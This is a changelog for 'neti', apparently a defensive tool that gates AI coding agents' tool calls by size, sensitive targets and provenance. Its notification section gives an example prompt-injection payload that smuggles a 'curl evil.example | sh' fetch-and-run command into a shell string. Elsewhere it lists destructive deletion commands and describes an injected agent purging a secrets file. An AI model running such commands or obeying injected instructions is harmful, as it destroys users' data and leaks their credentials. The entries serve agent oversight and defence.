# Changelog

## Unreleased

### A flagged call now tells you, at the moment it happens

`Verdict.FLAG` is documented as *"Recorded and **surfaced**; the call proceeds."* The surfacing half
did not exist. A flagged deletion sat in a record file until somebody ran `neti report` — so on a
real machine **flagged and silent were the same experience**, for the one verdict that exists
precisely because a call must not be stopped and must not be quiet.

    neti — flag
    Bash
    cat targets.txt | xargs rm -rf
    clean up the old exports

`flag` alone by default, because it is the only verdict nothing else surfaces: a block and a confirm
are handed back to the agent as a sentence with a number in it, so the operator hears about those
from their own agent. `notify: {verdicts: [...]}` to widen it, `[]` or `NETI_NO_NOTIFY=1` to
silence.

This is deliberately **not** a desktop app. The console is a viewer; the hook is the product, and
the notification belongs in the infrastructure that already runs on every tool call. An Electron
shell would have been ~120 MB per platform, code signing, notarisation and an auto-update pipeline
to deliver the one thing that actually changes what the product does — and a security tool that
silently goes stale is worse than one you update deliberately.

Three properties, all asserted, and all of them about what must *not* happen:

- **It can never break the hook.** `neti hook` runs on every tool call; an exception escaping it
  fails every subsequent call in the session. Every path is inside a bare `except`.
- **It can never wait.** Spawned and abandoned. Measured: p50 141ms notifying against 131ms
  silenced, on the same hook and the same records — inside the noise of interpreter start.
- **The text is never interpolated into a script.** It contains the command the agent proposed, and
  an agent can be prompt-injected; `rm -rf x" & do shell script "curl evil.example | sh` is the
  shape of the attack this product exists to gate, arriving at an interpreter. It travels as
  `argv` — `on run argv` on macOS, `notify-send` on Linux — so it is data by construction rather
  than by escaping carefully enough. Windows is left undone rather than done unsafely.

Three defects found by running it, all of which would have shipped:

**The first version posted nothing, silently.** `osascript -` reads its script from stdin, which the
spawner deliberately closes — a notably poor failure for the feature whose whole job is to stop
being silent.

**The guard checked `isatty`,** which is the obvious-looking one and is exactly wrong: `neti hook`
reads its event from a pipe, so stdin is never a tty in the one place this serves. It would have
disabled notifications everywhere while looking thoughtful.

**`notify: {on: [flag]}` was unusable as a policy key.** YAML 1.1 reads a bare `on` as the boolean
`True`, so it parses to `{True: ["flag"]}` and every lookup misses — dead config that reads as live,
which is the failure `config/policy.py` opens by warning about. The key is `verdicts:`, and `on:` is
rejected by name rather than ignored.

Two smaller ones: fire-and-forget `Popen` raises `ResourceWarning` when collected with the child
alive, which pytest turns into a failure — the handles are held and pruned now. And the suite was
raising real notifications on the machine running it, twice per run, because the seam tests drive a
real flag through the real hook. A root `conftest.py` sets `NETI_NO_NOTIFY`.

### The rail was ten flat entries and three of them get opened

Counted rather than argued about, for a free local install:

    Overview, Decisions, Policy          daily
    Live gate, Audit, Scorecard          occasionally, or once while evaluating
    Getting started, Connect, Models     once, during setup
    Approvals                            never — `attached: false`, structurally empty

`Approvals` was the worst of them. A control plane is the hosted tier, so on every free install that
page can *never* have content — **a permanent nav entry that is advertising rather than navigation**,
and it made the nine real ones harder to find. It appears when one is attached.

`Getting started` disappears once the walkthrough is complete. Onboarding that will not get out of
the way is a permanent reminder of a finished job; it is still at `/start` for anyone wiring a second
seam later.

The rest is grouped by how often anybody opens it rather than by category, with a rule between the
groups. Nothing is unreachable — everything demoted still has a URL. A settled install now shows
**eight**, in three groups of three, two, and… three.

Three of the ten were mine, added over this session without anybody counting the total. The
`DAILY` group is asserted at exactly three, so a fourth has to be argued for.

### The console can see all three axes

Two of them shipped in the engine with the console knowing about neither. `/policy` listed ceilings
and nothing else, so an operator with a `sensitive:` block had no way to read their own policy back
— and a rule you cannot see is a rule you cannot check, which is most of what that page is for.
The same shape as every Entra assumption this project keeps finding: capability the UI does not
reflect.

`/policy` now has a section per axis, in the order they answer different questions: *how big*,
*what is it*, *what has this session already eaten*. `/decisions` rows carry the reason when the
reason was not a number — both new axes fire precisely on calls whose magnitude is unremarkable,
so `Blocked · 1 object` was the least informative thing the row could have said.

### `sensitive:` — gated on what a thing is, not how much of it there is

`SCOPE.md` has carried this since the first release and had no answer for it:

    NC-02  Deleting the one row that mattered. Magnitude is the wrong primitive.
           A cardinality of 1 is always under every ceiling.
    NC-05  Low-cardinality but high-consequence targets. Consequence is not cardinality.

`.env` is one object. `.ssh/` is one directory. No ceiling anybody would write reaches either, and
no amount of tuning the numbers ever will — that is what *"the wrong primitive"* means. The answer
is not a better number, it is a **second comparison**:

```yaml
sensitive:
  - { match: "**/*.env",   verdict: confirm, why: credentials live here }
  - { match: "**/.ssh/**", verdict: block,   why: nothing here is an agent's business }
```

Declared exactly like every other number here — a static match against a list a person committed,
nothing inferred, nothing learned, and the verdict still replays from the record. It **joins** with
the magnitude verdict rather than replacing it, so a rule written badly costs a confirmation and
never a silent allow; a `sensitive` rule of `allow` cannot rescue a call the ceiling already
stopped, which is asserted.

The agent hears the difference, and that matters more than it looks:

> Preflight blocked this call: `/path` matches `'**/*.env'`, which is gated on what it is rather
> than how large it is — credentials live here. **Size is not the issue here; choose a different
> target.**

The standard sentence ends *"narrow the target and try again"*, which would have sent it to delete a
smaller part of the same secret. When both axes fire at once the record and the sentence name
whichever one actually **decided** — an operator tuning the wrong number otherwise wonders why
nothing changes.

The glob engine moved to `core/globs.py` on the way, because `provenance:` and `sensitive:` both
need it and two copies that disagreed about what `*` means would disagree about which calls are
gated. Shipped commented-out in `examples/coding-agent.yaml`: the right list is the operator's, not
a generator's.

`SCOPE.md` NC-02 and NC-05 updated — and honest that the value moved from *impossible* to
*declared*, not to *inferred*. An undeclared small target in a clean session is still invisible, and
anything built on counting always will be.

### `neti propose` stopped waiting for a sample size that never arrives

The defect that shipped in 0.2.0, found by installing the wheel and being a user for an afternoon.

`propose` refuses below 30 observations, which is right for a gate that reads — a ceiling fitted to
nine calls encodes the accident of that week and looks configured while doing it. It is exactly
wrong for a gate that *deletes*. Measured on a real project: **3 sizeable deletions in 274 calls.**
So `propose` said *"only 5 observations; 30 needed"* forever, nobody ever declared a `Bash` ceiling,
and `rm -rf node_modules` was sized at 968 objects and **allowed, in enforce mode**. A user who
followed every instruction correctly ended up protected against wide reads and not against deletion.

Waiting for a sample size that will not arrive is not caution. It is a silent absence, which is the
failure mode this whole project keeps finding in itself.

A destructive gate is now proposed for from whatever it has, anchored on the **median** deletion
rather than the largest — the largest is usually the one you would want stopped, and a ceiling above
it catches nothing, which is dead config in its most expensive form:

    observed  n=5  p50 of the deletions seen=968  max=5,011 [objects]
    proposed  confirm above 1,000   block above 5,000
    IMPACT    would have blocked 2 call(s) and asked about 0

Applied to the project where the gap was found, `rm -rf node_modules` (968) now passes silently and
`git clean -fdx` (4,786) asks. The rationale says out loud that this is the one place the tool
reasons from too few samples to be statistical, and that the number wants editing.

The signal had to exist first: `shell.paths` marked `destructive` only on the *unsizeable* path, so
a gate whose deletions all resolved cleanly looked — to anything reading records — exactly like a
gate that had never seen one. A command the parser understood is destructive by construction, and
now says so.

The existing property test asserting "below the threshold it never proposes" is scoped to
non-destructive gates and points at the new one. Disabling the new branch fails five tests.

### Provenance: the axis magnitude is blind to

Everything in this product so far answers *how big*. A prompt injection is small at both ends — the
ingest is one ticket, and the payload can be one file — so magnitude never sees it. Against the
LangChain demo the gate stopped `purge("customer_data")` on 2,240 objects, and would have allowed
`purge("src/secrets.env")`, which is the same attack with a better-chosen target.

What is new is **not** intelligence. No model reads the agent's reasoning, nothing is scored, and
nothing is inferred. It answers one mechanical question:

> has this session already touched a target the operator declared untrusted?

The injected text can claim anything it likes about being authorised; **it cannot change the fact
that the session read `customer_data/` two calls ago.**

```yaml
provenance:
  untrusted: [customer_data/**]
  bands:
    - { above: 0, verdict: confirm }
```

Measured against the running demo — the same call, the only difference being what the session read
first:

    clean   (read reports/)        purge('src/secrets.env') → ALLOW    (1 object)
    tainted (read customer_data/)  purge('src/secrets.env') → CONFIRM  (1 object)

Four properties, all asserted:

- **Escalate only.** The provenance bands are *added* to each gate's own, never substituted, so a
  permissive one cannot rescue a call the declared ceiling already stopped. A mistake here costs a
  confirmation and never a silent allow.
- **A call cannot taint itself.** The read that ingests untrusted content is judged under the
  ordinary ceilings — otherwise the first read of any ticket is impossible, which is the agent's
  whole job.
- **A blocked read does not taint.** It never ran, so nothing was ingested.
- **Sessions do not contaminate each other**, and the taint latches: there is no un-reading a
  stranger's file.

The record says *why*, not just that — `downstream of: read_files read customer_data/ticket_17.md,
matched rule customer_data/**`. Outside `chained`, for the same reason `synthetic` needed a schema
version: adding a key to the digest payload unconditionally would report every previously sealed
chain as tampered with. The verdict it produced is already covered, because the tightened ceiling
appears in `causes[].ceiling` like any other.

One real bug found in the writing: the "a pattern naming a directory covers what is under it"
convenience was implemented by matching the target's *parent*, so `dirname("customer_data/a/b.md")`
is `customer_data/a`, which `customer_data/*` matches — a rule naming one level silently named the
whole tree and `*` stopped meaning anything different from `**`. It is a prefix test now, and only
for patterns with no wildcard in them.

`SCOPE.md` NC-02 updated: partially addressed, and honest about what it still does not reach — a
small call in a clean session, which nothing here ever will.

### The sidebar row had drifted from the one it was copied from

Measured against `clarity-platform/src/components/Sidebar.tsx` rather than guessed at:

    claritty   "w-full flex items-center gap-3 py-2.5 rounded-lg"
               isActive ? "bg-blue-50 dark:bg-blue-500/15 …"
    neti       "flex w-full items-center gap-3 py-2.5"
               active   ? "bg-accent/10 …"

No radius at all against its `rounded-lg` — the browser reported `borderRadius: 0px` — and a 10%
active tint against its 15% in dark. The square corner is the one that shows: a full-bleed bar reads
as a section header rather than a selected row, which is the opposite of what the state means.

DESIGN.md says these primitives are **copied, not imported**, because a build-time dependency on the
Claritty monorepo would undo neti being a standalone repository, and that the cost is drift the tests
have to catch. Nothing was catching this one. Now something is.

Worth recording how that test first failed: it passed against markup with the radius deleted, because
the comment *explaining* the radius contains the string `rounded-lg`. It was reading prose, not
classes. Comments are stripped before matching now, and both assertions were re-checked by deleting
the thing they guard.

### The live gate was unusable for a coding agent, and its trace was inventing provenance

Second in the nav, the page the product is demonstrated on, and against
`examples/coding-agent.yaml` it did not work at all.

**The target dropdown was empty and the button did nothing.** Targets came from the Entra fixture,
which is `null` for any policy binding no directory. The *tool* list one field up had already been
fixed for exactly this — it was four hardcoded Entra names — and the target list had not. `/api/targets`
now derives suggestions from the resolvers the policy actually binds, off the root it declares: real
directories, a real file, and for the shell one command of each kind, because the three-way split is
the thing about `shell.paths` a person has to see once.

    rm -rf build              a deletion it can size — the bands decide
    cat list.txt | xargs rm   a deletion it cannot size — recognised, flagged, and it runs
    npm test                  not a deletion at all — silent

**The argument name was guessed.** `tool.includes("group") ? "group" : "to"` — Entra-shaped, and
wrong for every filesystem tool there is. A fired `Bash` call carried `to` rather than `command`, so
the gate saw no target and routed the whole thing through `on_unresolved`. The policy has known the
answer the entire time; `/api/targets` returns it.

**And the trace narrated a request that was never sent.** This is the worst of the three. A
`shell.paths` call that walked the local filesystem was reported as:

    Bind resolver         shell.paths · GroupMember.Read.All · read-only
    Assert preconditions  ConsistencyLevel: eventual ✓ · expect text/plain ✓
    Count                 GET → 200 · 1 objects · exact
    agent → neti → Microsoft Graph

A Microsoft Graph scope, a Graph header, an HTTP status and a destination — none of which existed —
under a lede that says *nothing here is pre-recorded*, about a decision that was entirely real. Not
a stale label. Invented provenance presented as evidence, in a security product, on the page built
to be believed. It now reads:

    Bind resolver         shell.paths · no credential — reads this machine
    Assert preconditions  walk cap set ✓ · a truncated walk is a floor, never a total ✓
    Count                 parsed · rm_like · 1 objects · exact
    agent → neti → this machine

The resolver name travels with the stage, which is what made any of it knowable — the console had
no way to tell which resolver had run. The Entra path is unchanged and re-checked: scope, header,
`GET /groups/…/$count → 200` and Microsoft Graph all still there when that is what happened. Both
branches are pinned.

Also: the idle copy said *"run the scenario"* to everybody, including policies that have none — the
shipped scenarios are Entra-shaped, so a coding-agent install was told to press something that was
not on the page.

### `/connect` stopped claiming a directory that a coding agent does not have

The page a new arrival is sent to first — the walkthrough links straight at it — opened with:

    ✓  Microsoft 365 · Entra ID
       Connected to this machine.

for `examples/coding-agent.yaml`, whose every gate is `fs.paths` or `shell.paths`. A product name
over a status that was not about it, a tenant label spliced under it, and a Disconnect button for a
credential the install neither has nor needs. This is the same wrong assumption that once branded a
filesystem gate a *"Demo tenant"*, marked its measured records synthetic, and offered fixture groups
as things to point `Glob` at — surviving in one more place. `connected` already said the right
thing; nothing had ever asked whether there was anything to connect **to**.

`binds_directory` now travels with the state, and a policy that binds none gets a fact instead of an
empty status:

> **Nothing to connect.** This policy binds fs.paths, shell.paths, which resolve off this machine —
> no credential, no directory, no network. Every magnitude it reports is measured from real files
> here. The only wiring left is the half below.

The Entra path is untouched and re-checked: Connect button, permission scope, the verification
paragraph, the scene and the fixture disclosure all return when a directory is actually bound.

**And the install tabs open on the seam this machine has.** The first tab was *An MCP server* for
everybody, so an install with no MCP servers configured — the common case for a coding agent — landed
on a before/after of `@acme/entra-mcp`, a fictional server it does not run, while the tab that
applied to it sat unselected next door. It reads `/api/start`, which already knows which doors are
here, and opens on *Built-in tools* when that is what there is.

### The console scrolled sideways on every page, and its light theme was not legible

Both found by measuring the running product rather than reading it, which is becoming the pattern.

**Horizontal overflow, everywhere.** `<main>` is a flex child, and a flex child defaults to
`min-width: auto` — so it refuses to shrink below its widest descendant. With `flex-1` sizing it to
the full row *and* `md:ml-16` reserving the rail's 64px on top, the document came out 64 pixels wider
than the viewport on **every page, at every size**. One long command line made it far worse: 1,190px
of document inside a 614px window. One token — `min-w-0` — fixes all of it, and it is also the token
that lets `overflow-x-auto` on a child actually engage. All ten pages now measure clean at 390px.

**The light theme's verdict scale was unreadable.** Both themes shipped the *same* three values,
which is fine on near-black and fails on off-white. Measured against the light background:

    confirm  #F59E0B   1.99:1     19 instances on /policy alone
    allow    #10B981   2.42:1
    block    #EF4444   3.53:1

All three under the 4.5 a checker asks for, on the one channel in this product that carries meaning.
The light theme now has its own darker set — hue held, only lightness moved, so a mark stays
recognisably block, confirm or allow — at 4.54, 4.52 and 4.67. They sit 27–64 ΔE from each other and
45+ from the accent, well over the floor of 15, so the existing separation tests are untouched.

`--muted-foreground` came in at 4.38:1 too — 207 instances across six pages, which is nearly all the
explanatory copy this product leans on to say what a number means. 47% → 44% lightness, and the hue
does not move.

DESIGN.md's *never colour alone* rule meant nothing was strictly lost — every verdict carries an icon
and a label — but "the fallback works" is not a reason to ship an unreadable primary.

Three new property tests compute the contrast from the tokens themselves and assert both themes, and
one asserts `<main>` keeps `min-w-0`. Each was checked against the value it replaced: revert the
amber and the test names it at 1.99.

### Ceilings can be declared from the console, and the number is still never the console's

The policy page was read-only, so a fresh install showed nine rows all saying *no ceiling —
resolves and records, cannot block*: an accurate description of a gate that cannot yet do the thing
the product is for, to somebody with no obvious way to change it. The old comment defended this on
the grounds that editing here "would make the number something the console owns", which is the right
worry about the wrong mechanism. What must never happen is a number being **inferred**. A person
typing one into a field, beside their own observed distribution, and reading the diff before agreeing
to it, is exactly as declared as the same person typing it into the file.

So each gate now has *Declare a ceiling*, and three things hold:

- **Nothing is prefilled.** The distribution from their own recorded traffic sits beside the field —
  p50, p95, max — because that is what makes a number choosable. Under it: *"this would have stopped
  1 of 1 recorded call at this gate"*. Choosing is still theirs.
- **The diff comes before the write**, then the file is backed up. Same contract `neti install` gives
  `.claude/settings.json`.
- **Every comment survives.** The edit is a text splice, not a YAML round trip:
  `examples/coding-agent.yaml` is more comment than configuration and the comments are most of its
  value. 108 comment lines in, 108 out.

`insight/edit_policy.py` finds the gate depth-first — `/file_path` is gated under three tools and
matching the first would produce a file that parses, loads and gates the wrong thing, the worst
failure available here — handles the one-line flow mappings the shipped example uses for `Read`,
`Edit` and `Write`, follows the file's own indentation, and **loads the result before offering it**.
That last check earned itself immediately: the first version spliced a block `bands:` under an inline
mapping, produced invalid YAML, and refused to write. A ceiling that will not load is not a rejected
form, it is a silently disabled gate — `neti hook` exits 0 on a policy error by design, so the next
session would have run entirely ungated with the reason on stderr where nothing reads it.

### Models: your keys, your machine, and your own domain

A new page for the one thing in this product that talks to a model. Anthropic and OpenAI report
whether their variable is **set** — never what it holds — and the local section lists Ollama,
LM Studio, vLLM and llama.cpp with the address each listens on and the command that starts it, plus
*your own endpoint* for a self-hosted gateway, because that is not a different integration, it is a
different URL.

**There is no field to type a key into, and there will not be.** A key pasted into a browser is a key
in a process that did not need it, and "nothing extra holds your secrets" is the claim the whole
feature rests on. What the console does instead is check reachability, which is the part people
actually get wrong — a runner on the wrong port, a gateway behind a proxy, a model id that is not
loaded. `Check` asks the endpoint what it holds and prints the list; against this machine it returned
six real Ollama models. It runs no completion, so a cold 30B model does not take minutes and a
metered gateway is not billed for a connectivity check.

One defect caught in the writing and worth recording: the first version of that probe attached
`OPENAI_API_KEY` as a bearer token, on the reasoning that a gateway usually wants one — which would
have sent the operator's key to whatever address they typed into a browser field, typos and hostile
hosts included. That is credential exfiltration built into a convenience feature. It sends no
Authorization header at all now, and loses nothing: a gateway that requires auth answers 401, and
*reachable, needs auth* is exactly as useful an answer here.

### The scorecard stopped looking cut

Every incident row carried a `border-t` inside a `space-y-2` list, so each rule floated detached
eight pixels above its own content and every row read as a slab that had lost its top. A list is
continuous: one rule between neighbours, none floating, and the space moved to where it means
something — above the bucket heading, which is now a heading rather than another 13px label. The two
remaining `.panel` plates became sections separated by rules, per DESIGN.md.

Also fixed while there: the pill rule's check found a real button with `px-3.5` and called it a
container, because it read one line at a time and a `className` inside a multi-line `<button>` has no
tag on it. It now resolves the **nearest** enclosing JSX tag — nearest, not "any within a window",
which would exempt a container merely sitting beside a control, and that is precisely the regression
the rule exists to catch. Verified in both directions against a probe file.

### The console opens on a walkthrough of your machine, not a number

A first run reached an overview: 59,330 reachable, 0 decisions, 0 blocked, a warning that nine
parameters had no ceiling, and — above all of it — a rotating band about hosted approvals. Every
number true, and not one of them answering the only two questions anybody has on their first run:
**what is this, and how do I make it work with what I actually run.** The answer was in
`docs/TUTORIAL.md`, which is not in the product.

So `/api/start` reads the machine and returns the walkthrough as *state*, and the console leads with
it until there is traffic to lead with instead:

    ✓ Declare what is gated              9 parameter(s) gated by examples/coding-agent.yaml
    ✓ See what one call could touch      read straight from this machine
    3 Put the gate in front of your agent
        Claude Code — this project   BUILT-IN TOOLS
        /Users/you/proj/.claude/settings.json
        no settings file here yet; the install creates one
        $ neti install -c examples/coding-agent.yaml
        Claude Code — every session  BUILT-IN TOOLS
        $ neti install -c examples/coding-agent.yaml --user
    4 Work normally, and watch the decisions arrive
    5 Declare ceilings, then turn it on

Two things make it a tutorial rather than instructions with a tick box.

**It is about their machine.** Real paths, every MCP server their clients are actually configured to
launch with the wrap command for each, and the right scope flag — project before `--user`, because
proposing to gate every session on somebody's machine is not a checklist's call to make. A server
already behind the gate reads as *gated* rather than vanishing, and settings that will not parse say
so instead of being dropped: a missing row reads as "you don't run this", which is the wrong thing
to tell somebody who does.

**It ticks itself while you watch.** Polled, not refreshed. Run `neti install` in another window and
the step completes under the cursor — which is also the proof that the check is the settings file
rather than a flag. Nothing is stored: uninstall the hook and step three un-ticks. A checklist that
lies about your machine is worse than none.

`/start` keeps it reachable afterwards, second in the nav, because the overview stops showing it the
moment the first call is recorded and somebody wiring a second seam a week later needs it back. And
`neti start` now names `neti console` as *the* walkthrough rather than pointing at
`docs/TUTORIAL.md` — a repository path a `pip install` does not have, which was the whole thing that
was wrong: the walkthrough lived outside the product.

Driven end to end against a clean project rather than a fixture — `neti start` in an empty
repository, then every step completed by doing the real thing in another window, with nothing
touching the console:

    neti start                                  71 objects measured, policy written
    neti install -c neti.yaml                   step 3 ticks four seconds later
    two calls through the hook                  step 4 ticks
    a ceiling declared from /policy, enforce    step 5 ticks, "complete"
    a real Glob                                 blocked: 40 objects above the ceiling of 20
    hook removed from settings.json             step 3 un-ticks; the other four stay

That last line is the property the whole design rests on, and it is why there is no stored flag.

One defect this found in the writing: `neti install` records an absolute policy path in the hook
command, and the console is launched with whatever `--config` said. Planning the check against the
relative path never matched, so the walkthrough would have told an installed user they were not.
Resolved for the check, as typed for the display.

Also: the pill rule now states that **a square box with a full radius is a circle, not a pill** —
a status dot, an avatar, a numbered step marker. It was five hardcoded sizes, so every new circle
was a test failure and a sixth string; the principle is stated once instead.

### A deletion nobody can measure no longer passes in the same silence as `npm test`

Shipping `shell.paths` left a hole the changelog below admitted and the product did not: three of
six commands could not be resolved, and one of them was `cat list.txt | xargs rm`. That call
deletes files, neti recognised it could not size it, and `on_unresolved: allow` then let it through
without a word — **which is worse than leaving `Bash` ungated**, because an absence you can see is
not the same as an absence that looks like coverage.

The cause was a conflation, not a weak parser. Two unlike facts arrived as one `UNRESOLVED`:

    npm test                    this is not a filesystem deletion
    cat list.txt | xargs rm     this is a deletion and I cannot tell you how big

One hook, so an operator had to pick which one to get wrong. `allow` and the deletion is invisible;
`confirm` and every ordinary command stops for a human, and the gate is uninstalled by Friday.

So the resolver now reports which of the two it is, and `on_unsized_risk` decides the second
separately. One command line, three outcomes:

    rm -rf node_modules        22,794 objects      bands decide            → blocked
    cat list.txt | xargs rm    destructive_verb:rm recorded and surfaced   → runs, and is seen
    npm test                   not a deletion      no signal               → silent

`Verdict.FLAG` has existed since the first release — *"recorded and surfaced; the call proceeds"* —
and no shipped policy had ever produced one. It is exactly shaped for a call that must not be
stopped and must not be quiet. `flag` is the default over `confirm` because on one machine a
CONFIRM stops the call, `git rm` and `xargs rm` are ordinary, and **blocking on a magnitude you have
just admitted you cannot read is a judgement this product has no basis for**. One word in the policy
changes it; the record is identical either way.

The signal is textual, and deliberately conservative *in the opposite direction from sizing*.
Sizing declines when unsure, because a wrong number is unsound. Flagging fires when unsure, because
surfacing costs a line and missing costs the deletion. It reads command position rather than the
line — `grep -rn 'rm' src/` and `echo "rm -rf /"` mention the verb and do not run it — tracks quotes
so `bash -lc 'find / | xargs rm'` stays one command, and treats `>` as destructive only over a file
that already exists, because `pytest -q > out.txt` destroys nothing. The false-positive corpus in
`tests/e2e/test_unsized_risk.py` is the load-bearing test: fourteen commands a coding agent runs
several times an hour, none of which may ever flag.

`neti report` gives flagged calls their own section, with what ran, why it could not be sized and
what the agent said it was doing. `/decisions` stops collapsing them into the neutral "Could not
size" chip, and a flagged decision no longer opens under the headline "This call was allowed".

**What still escapes is now written down** as `SCOPE.md` NC-15 rather than implied: `./cleanup.sh`
deletes and no textual signal will ever see it. The flag narrows what passes silently; it does not
make the shell covered.

One defect the plan did not anticipate, found by running `neti verify --config` over a real session
rather than by reading the code: `decide` now routes on a signal carried in `Resolution.evidence`,
and the replay rebuilt an unresolved resolution with an empty one — so **every recorded `flag`
re-derived as `allow`** and the tool reported the log as inconsistent with itself. The record had
carried the fact the whole time; nothing read it back. `test_a_flag_replays_as_a_flag` pins it.

`on_unsized_risk` is additive and unset means unchanged, so every policy written before this behaves
exactly as it did. The two new keys on a record cause — `reason` and `destructive` — are additive
within `neti.decision.v2` because causes are stored dicts rather than models: a record written last
week is re-read exactly as it was written and recomputes the digest it was sealed with.

### `neti report` says what the agent called it

The terminal half of the same finding. A breach now reads:

    Bash /command   n=3   p50=211   p95=22,794   max=22,794  [objects]
        3 could not be resolved
        ▸ 1 call(s) exceeded a declared ceiling
            22,794 objects against a ceiling of 500   (c40f32fa)
                the agent said: "clean up build artifacts"

`ReportSummary` carries a `stated` map keyed by decision id rather than widening the `over_ceiling`
tuple, which the API and the console both read — a fourth element there would have been a breaking
change to something already shipped, for a field only the printer needs.

Also visible above, and worth reading honestly: **three of six commands could not be resolved.**
`npm test` and `git status` should not be, and `cat list.txt | xargs rm` genuinely is destructive and
was declined. Shell coverage is a floor, not a ceiling, and the number of declines is printed rather
than hidden so nobody mistakes silence for safety.

> Superseded by `on_unsized_risk`, above. Printing the count was the right instinct and the wrong
> resolution: three declines on one line still reads as three harmless commands. The two are now
> counted apart, and the destructive ones get their own section.

### The claim, beside the number

`/decisions` now reads:

    Blocked        Bash  "clean up build artifacts"   22,794 objects
    Allowed        Bash  "remove the old package"        211 objects
    Allowed        Bash  "tidy the working tree"           3 objects
    Could not size Bash  "run the tests"            unsizeable

Every row is what the agent said it was doing, next to what the call would actually have touched.
The pairing is the finding, and it needed no new data at all — `description` has been sealed inside
the chained record since the first `Bash` call was ever recorded. Nothing had ever put the two
facts on the same line.

It is in the row rather than the detail view on purpose: the mismatch is the thing worth seeing at a
glance, and a mismatch you have to click into is one nobody finds.

Recorded, never trusted. It is evidence for a human and an input to nothing.

### `shell.paths` — the level a coding agent actually acts at

`Bash` was not gated. The shipped policy covered `Glob`, `Grep`, `Read`, `Edit`, `Write` and three
directory tools, and everything else fell through `unknown_tool: allow` — so `rm -rf`,
`find . -delete`, `git clean -fd` and `git checkout -- .` were invisible. An agent that wants to
delete something does not reach for `Write`.

Against this repository, through the real hook binary:

    block   22,794  rm -rf web/node_modules     said: "clean up build artifacts"
    allow      211  rm -rf src/neti             said: "remove the old package"
    allow        3  git clean -fd               said: "tidy the working tree"
    allow  unresolved  npm test                 said: "run the tests"
    allow  unresolved  cat list.txt | xargs rm   said: "delete listed files"

The first line is the whole argument. The agent's own words sit beside the measurement, and they
needed no schema change: `description` is one of the call's arguments, and `args` is already inside
the chained payload — the claim was always sealed, there was simply never a magnitude to read it
against. **It is recorded, never trusted.** A confident sentence must not buy a large action, and
`SCOPE.md`'s claim that no model drifts in the decision path stays literally true.

**It declines far more than it claims, and that is the design.** Pipelines, subshells, backticks,
`$(…)`, shell variables, unknown binaries, wrapper scripts, `find` without `-delete`, `git status` —
all UNRESOLVED, and the declared `on_unresolved` decides. `find . -name '*.log' -delete` is sized as
the whole of `.` rather than the matching files, because honouring the filter would make the number
*smaller* than the truth, and one target it cannot read fails the entire command rather than
reporting the half it could count. Over-counting is sound; under-counting lets a large deletion
through under a ceiling.

**A deliberate decision was overturned, not deleted.** `test_bash_is_ungated_on_purpose_and_says_so`
argued that sizing `Bash` means *"a gate guessing at a string's meaning rather than reading a
value"*, and cited `rm -rf "$X/../.."`. That objection is now the specification rather than a
refusal: the test asserts `Bash` is gated *and* that this exact command is still declined. The
standard did not move; the coverage did.

`on_unresolved: allow` ships by default, which is the difference between a gate people keep and one
they remove on Friday: `npm test` and `git status` pass in silence, and only a command that can be
read literally gets a number.

### The live gate was unusable on the most common install there is

Three faults, one assumption: that a gate needs a directory.

**`connected` meant "`entra.principals` answered".** So a coding-agent policy — gated on `fs.paths`,
needing no credential and having nothing to connect *to* — could never become connected, and
`/gate` opened on *"Not connected yet"* and stopped. For an install whose gate was working
perfectly. It now means *the resolvers this policy binds can answer*, via a new
`Policy.bound_resolvers()`, and a policy that binds no directory starts connected because it is.
`directory_size` still reports Entra specifically, since that is what its name says.

**The tool picker was four hardcoded Entra names.** "Fire your own" offered `remove_group_members`
and `delete_group` to a policy that gates `Glob` and `Read`. It reads `gated_tools`, which the state
payload already carried and the page ignored, and defaults to the policy's first tool rather than a
name that may not exist there.

**The target picker offered groups that do not exist.** The synthetic tenant was attached whenever
demo mode was on, so `fixture` was published — and the gate renders it as the target list. A
filesystem policy was invited to point `Glob` at *"All Engineering (nested) — 41,203"*. The tenant is
published only when the policy actually asks a directory something now.

Against the real repository: `connected: True`, tools `['Glob', 'Read']`, fixture `None`.

Same root as the "Demo tenant" badge and the console that ignored `providers:` — each found by
running the thing rather than reading it.

### Pointed at a real repository, and it found something a fixture never could

Five calls through the real `neti hook` binary, against this repository — 59,148 files, nothing
simulated:

    Read src/neti/engine.py                    allowed, silent
    Glob src/neti/adapters/*.py                allowed, silent
    Glob src/**/*.py                           allowed, silent
    Glob **/*                    22,940        DENIED
    Glob web/node_modules/**/*.js 12,082       DENIED

The fourth and fifth are the point, and the fifth especially: an agent asked to look at the JS files
writes a glob that pulls **twelve thousand `node_modules` files** into context. Nothing else in the
stack stops that — the agent may read files, the path is inside the project, nothing is malicious.
It is simply enormous, and the size is the only thing wrong with it. The first three stayed silent,
which is the half that decides whether anybody keeps it installed.

Five records, chain intact. Flipping one verdict gave `CHAIN BROKEN at decision 50f0103f…`, and
restoring it returned the identical head.

**And the honest finding.** The console reported *59,181 reachable in one call* — dominated by
`node_modules` and `.git`, where the repository proper is 35,563. The instinct is to add an ignore
list, and it is wrong: excluding directories would make the magnitude *under*-count, and
under-counting is the one error this gate must never make. You may block on a floor; you may never
allow on one. A glob really can reach those files.

So the number stays and the console now says what it counts, as does the tutorial. Narrowing
`providers.fs.root` is how you scope it. That gap was invisible against a fixture tree and obvious
within one command against a real one.

### The gate stops offering scenarios about tools you do not have

`/api/scenarios` returned the shipped Entra scenarios unconditionally, so a filesystem install —
gating `Glob`, `Read` and `delete_files` — was offered *"Offboard the Q3 contractors"*, which drives
`remove_group_members`. A tool that policy does not gate, a group that does not exist, presented
inside somebody's own console. That is mock data wearing the clothes of real data, which is the one
thing this project is least entitled to ship.

A scenario is offered only when the policy gates every tool it drives. The filesystem policy in the
demo workspace now returns **none of them** and the page drives the gate with that policy's own
tools instead.

**And `/gate` explains itself now.** It opened with a toggle, a form and an empty box, none of which
said what was about to happen or how the three relate — the reaction was *"I'm not sure what this
does and how it connects"*, which is the page's fault. Three numbered steps across the top, in the
order the page works: pick a call from your own policy, watch it resolve against the provider, see
the number compared to your ceiling.

**The Observe/Enforce toggle** was a pill segment floating inside a rectangle — the de-pilling sweep
had stripped the rail because it carried no control signal of its own. A segmented rail is a
control: it is a pill again, and the test now knows why.

### The featured band, at the top

`CloudSlides` moved to the head of the overview and grew into what it should have been: one large
slide at a time, an eyebrow, a headline you can read across the room, a **live scene**, and a single
action — the App Store's featured row, in neti's language.

Each slide now carries the scene that depicts its claim rather than describing it in prose:
approvals gets `GateScene` (a call stopped at a ceiling), fleet policy gets `ReachScene`, central
records gets `ChainScene`, the catalogue gets `ConnectScene`.

**No plate, which is the one place this departs from the App Store.** Those features sit on rounded
cards; neti's rules do not (DESIGN.md: do not default to cards, no shadows). The prominence comes
